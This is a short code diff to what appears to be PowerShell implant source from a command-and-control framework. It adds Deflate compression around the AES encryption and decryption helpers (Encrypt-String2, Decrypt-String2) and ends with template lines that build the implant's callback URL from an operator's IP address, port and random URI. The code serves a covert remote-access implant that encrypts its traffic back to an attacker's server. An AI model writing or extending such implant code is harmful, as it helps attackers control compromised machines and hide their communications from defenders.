@@ -108,8 +108,13 @@ function Encrypt-String2
         [Object]
         $unencryptedString
     )
-
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $CompressedStream = New-Object IO.MemoryStream
+    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
+    $DeflateStream.Dispose()
+    $bytes = $CompressedStream.ToArray()
+    $CompressedStream.Dispose()
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
@@ -132,7 +137,9 @@ function Decrypt-String2
     $aesManaged = Create-AesManagedObject $key $IV
     $decryptor = $aesManaged.CreateDecryptor()
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
-    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
+    $output
+    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 
 # encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
@@ -1182,25 +1189,28 @@ function Decrypt-String($key, $encryptedStringWithIV) {
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
 function Encrypt-String2($key, $unencryptedString) {
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $CompressedStream = New-Object IO.MemoryStream
+    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
+    $DeflateStream.Dispose()
+    $bytes = $CompressedStream.ToArray()
+    $CompressedStream.Dispose()
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
-    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    #$aesManaged.Dispose()
     $fullData
-    #[System.Convert]::ToBase64String($fullData)
 }
-
 function Decrypt-String2($key, $encryptedStringWithIV) {
     $bytes = $encryptedStringWithIV
-    #$bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
     $IV = $bytes[0..15]
     $aesManaged = Create-AesManagedObject $key $IV
-    $decryptor = $aesManaged.CreateDecryptor();
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
-    #$aesManaged.Dispose()
-    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+    $decryptor = $aesManaged.CreateDecryptor()
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
+    $output
+    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 $Server = "http://'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
 $ServerClean = "http://'+$ipv4address+":"+$serverport+'"
